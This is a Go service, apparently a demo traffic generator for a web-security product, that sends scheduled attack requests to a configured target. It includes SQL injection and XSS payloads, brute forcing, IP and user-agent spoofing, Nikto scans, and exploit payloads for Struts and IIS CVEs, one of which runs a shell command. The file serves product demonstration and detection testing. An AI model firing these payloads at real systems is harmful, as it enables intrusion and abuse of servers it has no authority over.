package main

import (
	"bytes"
	"fmt"
	"github.com/kardianos/service"
	"github.com/robfig/cron"
	"io"
	//"io/ioutil"
	"strings"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"time"
)

type Attack struct {
	name        string            /* Name of attack (for reference) */
	method      string            /* HTTP Request method (i.e. GET, POST, PUT, HEAD, OPTIONS) */
	maxNap      int               /* The max time(seconds) the attack should ever sleep before running */
	minNap      int               /* The min time(seconds) the attack should ever sleep before running */
	pause       int               /* The number of seconds to sleep after each request */
	maxRequests int               /* The max # of requests that should ever be sent */
	minRequests int               /* The min # of requests that should ever be sent */
	url         string            /* The request url */
	body        io.Reader         /* The request payload */
	headers     map[string]string /* Headers to be sent with request */
}

type Tool struct {
	name     string /* Name of the attack tool */
	location string /* Path to binary */
	host     string /* Host to run attack against */
}

type program struct{}

var (
	Info  *log.Logger
	Error *log.Logger

	/* Attacks */
	accountLink  Attack
	accountPmt   Attack
	accountXfer  Attack
	attackError  Attack
	attackSize   Attack
	attackTime   Attack
	auth         Attack
	bruteForce1  Attack
	bruteForce2  Attack
	hotLink      Attack
	hotLink2     Attack
	openRedirect Attack
	sqlBlast     Attack
	xssBlast     Attack
	searchApi    Attack
	cve20175638  Attack
	cve20177269  Attack
	cve20179805  Attack
	cve201711776 Attack
	impostor     Attack
	ratelimit    Attack	
	probe        Attack	
	niktoBlast   Tool
	niktoNoVpn   Tool

	/* Job Scheduler */
	c *cron.Cron
)

func Init(infoHandle io.Writer, errorHandle io.Writer) {

	Info = log.New(infoHandle,
		"INFO: ",
		log.Ldate|log.Ltime|log.Lshortfile)

	Error = log.New(errorHandle,
		"ERROR: ",
		log.Ldate|log.Ltime|log.Lshortfile)
}

func (p *program) Start(s service.Service) error {
	// Start should not block. Do the actual work async.

	/* Create Attacks */
	accountLink = Attack{name: "Account Link", method: "GET", maxNap: 1500, minNap: 300,
		pause: 1, maxRequests: 10, minRequests: 3, url: fmt.Sprintf("http://%s/account/link", target)}
	accountPmt = Attack{name: "Account Payment", method: "GET", maxNap: 1800, minNap: 60,
		pause: 2, maxRequests: 50, minRequests: 10, url: fmt.Sprintf("http://%s/account/payment", target)}
	accountXfer = Attack{name: "Account Transfer", method: "GET", maxNap: 1800, minNap: 300,
		pause: 2, maxRequests: 20, minRequests: 10, url: fmt.Sprintf("http://%s/account/transfer", target)}
	attackError = Attack{name: "Attack Error", method: "GET", maxNap: 1800, minNap: 300,
		pause: 2, maxRequests: 20, minRequests: 10,
		url: fmt.Sprintf("http://%s/account/index.php?account_select=%s", target, "'%20or%201=1%20--")}
	attackSize = Attack{name: "Attack Size", method: "GET", maxNap: 1800, minNap: 300,
		pause: 2, maxRequests: 3, minRequests: 1,
		url: fmt.Sprintf("http://%s/account/index.php?password=%s", target, "'%20or%201=1%20--")}
	attackTime = Attack{name: "Attack Time", method: "GET", maxNap: 1800, minNap: 300,
		pause: 2, maxRequests: 3, minRequests: 1,
		url: fmt.Sprintf("http://%s/users/profile.php?user=", target, "user='%20or%201=1%20--")}
	auth = Attack{name: "Auth", method: "POST", maxNap: 240, minNap: 0, pause: 2, maxRequests: 30,
		minRequests: 2, url: fmt.Sprintf("http://%s/login?%s", target, "userName=admin&password=taco"),
		headers: map[string]string{"Content-Type": "application/x-www-form-urlencoded"}}
	bruteForce1 = Attack{name: "Brute Force 1", method: "GET", maxNap: 0, minNap: 0, pause: 1,
		maxRequests: 1800, minRequests: 2, url: fmt.Sprintf("http://%s/login", target)}
	bruteForce2 = Attack{name: "Brute Force 2", method: "GET", maxNap: 7000, minNap: 1, pause: 10,
		url: fmt.Sprintf("http://%s/profile/", target)}
	hotLink = Attack{name: "Hot Link", method: "HEAD", maxNap: 600, minNap: 1,
		url:     fmt.Sprintf("http://%s/wp-content/precious.gif", target),
		headers: map[string]string{"Referer": "http://evil.taco"}}
	hotLink2 = Attack{name: "Hot Link 2", method: "HEAD", maxNap: 600, minNap: 1,
		url:     fmt.Sprintf("http://%s/uploads/mr_noodle.gif", target),
		headers: map[string]string{"Referer": "http://greedy.elmo"}}
	openRedirect = Attack{name: "Open Redirect", method: "GET", maxNap: 3000, minNap: 1,
		maxRequests: 5, minRequests: 1, url: fmt.Sprintf("http://%s/redirects/ord-test.php?url=", target)}
	searchApi = Attack{name: "Search API", method: "GET", maxNap: 7000, minNap: 1, maxRequests: 1200, pause: 1,
		minRequests: 800, url: fmt.Sprintf("http://%s/api/search", target)}
	sqlBlast = Attack{name: "SQL Blast", method: "GET", maxNap: 7000, minNap: 1, maxRequests: 1200, pause: 1,
		minRequests: 800, url: fmt.Sprintf("http://%s/?user_id=%s", target, "1029292%20OR%2019%3D19%20--%20-")}
	xssBlast = Attack{name: "XSS Blast", method: "GET", maxNap: 7000, minNap: 1, maxRequests: 1200, pause: 1,
		minRequests: 100, url: fmt.Sprintf("http://%s/forum/memberlist.php?account=%s", target, "%5C%22%3E%5C%22%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E")}
	impostor = Attack{name: "Impostor", method: "GET", maxNap: 0, minNap: 0,
		maxRequests: 15, minRequests: 10, url: fmt.Sprintf("http://%s/quotes/", target),
		headers: map[string]string{"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}}
	ratelimit = Attack{name: "RateLimit", method: "GET", maxNap: 0, minNap: 0,
		maxRequests: 15, minRequests: 10, url: fmt.Sprintf("http://%s/stockhistory/", target),
		headers: map[string]string{"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:10.0) Gecko/20100101 Firefox/10.0"}}
	probe = Attack{name: "Probe", method: "GET", maxNap: 0, minNap: 0,
		maxRequests: 15, minRequests: 10, url: fmt.Sprintf("http://%s/", target),
		headers: map[string]string{"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:10.0) Gecko/20100101 Firefox/10.0"}}
	cve20175638 = Attack{name: "cve20175638", method: "GET", maxNap: 0, minNap: 0, pause: 1,
		maxRequests: 10, minRequests: 2, url: fmt.Sprintf("http://%s/", target),
		headers: map[string]string{"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:10.0) Gecko/20100101 Firefox/10.0","Content-Type": "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?)multipart/form-data"}}
	cve20177269  = Attack{name: "cve20177269", method: "PROPFIND", maxNap: 0, minNap: 0, pause: 1,
		maxRequests: 10, minRequests: 2, url: fmt.Sprintf("http://%s/", target),
		headers: map[string]string{"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:10.0) Gecko/20100101 Firefox/10.0","If": "<http://1234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234123412341234>"}}
	cve20179805  = Attack{name: "cve20179805", method: "POST", maxNap: 0, minNap: 0, pause: 1,
		//maxRequests: 1800, minRequests: 2, url: fmt.Sprintf("http://%s/", target), body: fmt.Sprintf(`postkey1=<map> <entry> <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>/bin/sh</string><string>-c</string><string>#{cmd}</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer/> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> </entry></map>`),
		maxRequests: 10, minRequests: 2, url: fmt.Sprintf("http://%s/", target), body: strings.NewReader(`postkey1=<map> <entry> <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> <string>/bin/sh</string><string>-c</string><string>#{cmd}</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer/> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> </entry></map>`),
		//headers: map[string]string{"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:10.0) Gecko/20100101 Firefox/10.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Content-Type": "application/xml"}}
		headers: map[string]string{"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:10.0) Gecko/20100101 Firefox/10.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Content-Type": "application/xml"}}
	
	/* Attack Tools */
	niktoBlast = Tool{name: "Nikto Blast", location: "nikto/program/nikto.pl", host: target}
	niktoNoVpn = Tool{name: "Nikto No VPN", location: "nikto/program/nikto.pl", host: target}

	go p.run()
	return nil
}

func (p *program) run() {

	/* Schedule Attacks */
	c = cron.New()

	/* Every 1 minute */
	c.AddFunc("0 * * * *", func() { probe.send() })
	
	/* Every 5th minute */
	c.AddFunc("0 */5 * * *", func() { ratelimit.send() })
	
	/* Every 10th minute */
	c.AddFunc("0 */10 * * *", func() { impostor.send() })
	
	/* REMOVE Every 15th minute */
	
	/* Every 25th minute */
	c.AddFunc("0 */25 * * * *", func() { auth.send() })
	c.AddFunc("0 */25 * * * *", func() { cve20179805.send() })
	
	/* Every 30th minute */
	// c.AddFunc("0 */30 * * * *", func() { bruteForce1.send() })

	/* At minute 50 */
	c.AddFunc("0 50 * * * *", func() { sqlBlast.send() })
	c.AddFunc("0 50 * * * *", func() { cve20175638.send() })
	
	/* At minute 55 */
	c.AddFunc("0 55 * * * *", func() { niktoNoVpn.execute() })
	c.AddFunc("0 55 * * * *", func() { cve20177269.send() })
	
	/* Top of every hour */
	c.AddFunc("0 0 */1 * * *", func() { xssBlast.send() })
	
	/* Every 2nd hour */
	
	/* Every 3rd Hour */
	
	/* Every 4th hour */
	//c.AddFunc("0 0 */4 * * *", func() { bruteForce2.send() })
	
	/* At minute 18 past hour 1, 7, 13, and 19 */
	c.AddFunc("0 18 1,7,13,19 * * *", func() {
		niktoBlast.execute()
		time.Sleep(time.Duration(60 * time.Second))
		niktoBlast.execute()
	})

	/* Start scheduler */
	Info.Println("Starting attack scheduler")
	c.Start()
	inspect(c.Entries())

}

func (p *program) Stop(s service.Service) error {
	// Stop should not block. Return with a few seconds.
	c.Stop()
	return nil
}

func random(min, max int) int {
	rand.Seed(time.Now().UTC().UnixNano())
	return rand.Intn(max-min) + min
}

func randomIP() string {
	rand.Seed(time.Now().UTC().UnixNano())
	return ips[rand.Intn(len(ips))]
}

func RandomString(len int) string {
      bytes := make([]byte, len)
     for i := 0; i < len; i++ {
          bytes[i] = byte(65 + rand.Intn(25))  //A=65 and Z = 65+25
      }
      return string(bytes)
}

func (attack *Attack) send() {

	/* Create Request */
	req, err := http.NewRequest(attack.method, attack.url, attack.body)
	if err != nil {
		Error.Println(fmt.Sprintf("The following error occurred while creating the request for %s: %s", attack.name, err.Error()))
	}

	/* Get random ip from ip slice */
	//req.Header.Set("X-Source-Ip", randomIP())
	req.Header.Set("X-Forwarded-For", randomIP())

	/* Set Headers if they exist */
	if attack.headers != nil {
		for key, value := range attack.headers {
			req.Header.Set(key, value)
			Info.Println(fmt.Sprintf("Header Name:%s Header Value:%s", key, value))
		}
	}

	/* Delayed start? */
	nap := 0
	if attack.maxNap != 0 {
		nap = random(attack.minNap, attack.maxNap)
	}

	time.Sleep(time.Duration(nap) * time.Second)

	/* Execute attack specific logic */
	Info.Println(fmt.Sprintf("Executing %s attack:", attack.name))
	if attack.name == "Brute Force 2" {
		attack.force(req)

	} else if attack.name == "Hot Link" {
		attack.link(10, req)

	} else if attack.name == "Hot Link 2" {
		attack.link(5, req)
	
	} else if attack.name == "cve20175638" {
		Info.Println(fmt.Sprintf("Executing %s attack: method,url,body %s %s %s", attack.name, attack.method, attack.url, attack.body))
		attack.link(2, req)
	} else if attack.name == "cve20177269" {
		Info.Println(fmt.Sprintf("Executing %s attack: method,url,body %s %s %s", attack.name, attack.method, attack.url, attack.body))
		attack.link(2, req)
	} else if attack.name == "cve20179805" {
		Info.Println(fmt.Sprintf("Executing %s attack: method,url,body %s %s %s", attack.name, attack.method, attack.url, attack.body))
		attack.link(2, req)

	} else if attack.name == "Open Redirect" {
		attack.redirect(req)
		
	} else if attack.name == "Impostor" {
		Info.Println(fmt.Sprintf("Executing %s attack: method,url,body %s %s %s", attack.name, attack.method, attack.url, attack.body))
		attack.crawler(req)
	} else if attack.name == "RateLimit" {
		Info.Println(fmt.Sprintf("Executing %s attack: method,url,body %s %s %s", attack.name, attack.method, attack.url, attack.body))
		attack.crawler(req)
	} else if attack.name == "Probe" {
		Info.Println(fmt.Sprintf("Executing %s attack: method,url,body %s %s %s", attack.name, attack.method, attack.url, attack.body))
		attack.probe(req)
	} else {
		/* Get random # of requests to send */
		/* Send requests */
		var ua = ""
		for r := 0; r < random(attack.minRequests, attack.maxRequests); r++ {
			/* Get randomized user agent */
			ret := random(0, 2)
			
			if ret == 1 {
				ua = "SigSci Demo UA"
			}
			req.Header.Set("User-Agent", ua)
			resp, err := http.DefaultClient.Do(req)
			if err != nil {
				Error.Println(fmt.Sprintf("The following error occurred while executing %s:%s", attack.name, err.Error()))
			}
			if resp != nil {
				resp.Body.Close()
			}
			time.Sleep(time.Duration(attack.pause) * time.Second)
		}
	}
}

func (attack *Attack) force(request *http.Request) {
	var address bytes.Buffer
	for _, element := range usernames {
		address.WriteString(attack.url)
		address.WriteString(element)
		parsedUrl, err := url.Parse(address.String())
		request.URL = parsedUrl
		resp, err := http.DefaultClient.Do(request)
		if err != nil {
			Error.Println(fmt.Sprintf("The following error occurred while executing %s:%s", attack.name, err.Error()))
		}
		if resp != nil {
			resp.Body.Close()
		}
		address.Reset()
		time.Sleep(time.Duration(attack.pause) * time.Millisecond)

	}
}

func (attack *Attack) link(maxReqs int, request *http.Request) {
	for i := 0; i < 10; i++ {
		resp, err := http.DefaultClient.Do(request)
		if err != nil {
			Error.Println(fmt.Sprintf("The following error occurred while executing %s:%s", attack.name, err.Error()))
			Error.Println(fmt.Sprintf("Request:%s", request))
		}
		if resp != nil {
			resp.Body.Close()
		}
	}
}

func (attack *Attack) redirect(request *http.Request) {
	var address bytes.Buffer
	i := 1
	modBy := random(attack.minRequests, attack.maxRequests)
	for _, element := range urls {
		if i%modBy == 0 {
			address.WriteString(attack.url)
			address.WriteString(element)
			parsedUrl, err := url.Parse(address.String())
			request.URL = parsedUrl
			resp, err := http.DefaultClient.Do(request)
			if err != nil {
				Error.Println(fmt.Sprintf("The following error occurred while executing %s:%s", attack.name, err.Error()))
			}
			if resp != nil {
				resp.Body.Close()
			}
			address.Reset()
		}
		i++
		time.Sleep(time.Duration(modBy) * time.Second)
	}
}

func (attack *Attack) crawler(request *http.Request) {
	Info.Println(fmt.Sprintf("Add Crawler Paths"))
	var address bytes.Buffer
	i := 1
	//modBy := random(attack.minRequests, attack.maxRequests)
	for _, element := range crawlerpaths {
		//if i%modBy == 0 {
			address.WriteString(attack.url)
			address.WriteString(element)
			parsedUrl, err := url.Parse(address.String())
			request.URL = parsedUrl
			resp, err := http.DefaultClient.Do(request)
			//Info.Println(fmt.Sprintf("Executing %s attack: url: %s", attack.name, request.URL))
			if err != nil {
				//Error.Println(fmt.Sprintf("The following error occurred while executing %s:%s", attack.name, err.Error()))
			}
			if resp != nil {
				resp.Body.Close()
			}
			address.Reset()
		//}
		i++
		//time.Sleep(time.Duration(modBy) * time.Second)
	}
}

func (attack *Attack) probe(request *http.Request) {
	Info.Println(fmt.Sprintf("Add Probe Paths"))
	var address bytes.Buffer
	i := 1
	//modBy := random(attack.minRequests, attack.maxRequests)
	for _, element := range probeurls {
		//if i%modBy == 0 {
			address.WriteString(attack.url)
			address.WriteString(element)
			parsedUrl, err := url.Parse(address.String())
			request.URL = parsedUrl
			resp, err := http.DefaultClient.Do(request)
			//Info.Println(fmt.Sprintf("Executing %s attack: url: %s", attack.name, request.URL))
			if err != nil {
				//Error.Println(fmt.Sprintf("The following error occurred while executing %s:%s", attack.name, err.Error()))
			}
			if resp != nil {
				resp.Body.Close()
			}
			address.Reset()
		//}
		i++
		//time.Sleep(time.Duration(modBy) * time.Second)
	}
}

func (tool *Tool) execute() {

	Info.Println(fmt.Sprintf("Executing %s attack tool", tool.name))
	if tool.name == "Nikto Blast" {
		cmd := exec.Command(tool.location, "-h", tool.host, "-sourceip", randomIP())
		var out bytes.Buffer
		cmd.Stdout = &out
		err := cmd.Run()
		if err != nil {
			Error.Println(fmt.Sprintf("The following error occurred while executing %s:%s", tool.name, err.Error()))
			Error.Println("The error ouput is ", out.String())
		}
		Info.Println("The output is ", out.String())

	} else {
		nap := random(1, 2700)
		time.Sleep(time.Duration(nap) * time.Second)
		cmd := exec.Command(tool.location, "-h", tool.host, "-Pause", "1", "-T",
			"x48", "-sourceip", randomIP())
		var out bytes.Buffer
		cmd.Stdout = &out
		err := cmd.Run()
		if err != nil {
			Error.Println(fmt.Sprintf("The following error occurred while executing %s:%s", tool.name, err.Error()))
			Error.Println("The error ouput is ", out.String())
		}
		Info.Println("The output is ", out.String())
	}
}

func inspect(entries []*cron.Entry) {
	for _, entry := range entries {
		Info.Println(fmt.Sprintf("Scheduled for first run at %v", entry.Next))
	}
}

func main() {

	/* Initialize Logging */
	Init(os.Stdout, os.Stderr)

	svcConfig := &service.Config{
		Name:        "SigSciRandomHack",
		DisplayName: "SigSci RandomHack",
		Description: "Sends attack traffic to populate demo dashboards",
	}

	prg := &program{}
	s, err := service.New(prg, svcConfig)
	if err != nil {
		log.Fatal(err)
	}
	err = s.Run()
	if err != nil {
		Error.Println(fmt.Sprintf("Error running Sig Sci RandomHack service.  The error is %s", err.Error()))
	}

}
